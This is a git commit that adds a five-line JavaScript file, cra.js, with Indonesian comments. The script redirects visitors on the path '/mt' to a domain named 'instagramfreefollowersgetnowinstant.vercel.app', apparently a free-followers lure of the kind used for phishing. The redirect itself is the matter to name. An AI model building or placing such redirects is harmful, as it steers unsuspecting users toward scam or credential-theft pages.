43a4f40f19105767cbb40a77cf81e4a523f684ab
inggarfi <inggarsaput@gmail.com>
2025-04-24 18:11:02 +0700

    Create cra.js

---
+++ cra.js
@@ -0,0 +1,5 @@
+// Cek path URL
+if (window.location.pathname === "/mt") {
+  // Redirect ke URL target
+  window.location.href = "https://instagramfreefollowersgetnowinstant.vercel.app/?id=6761802134";
+}
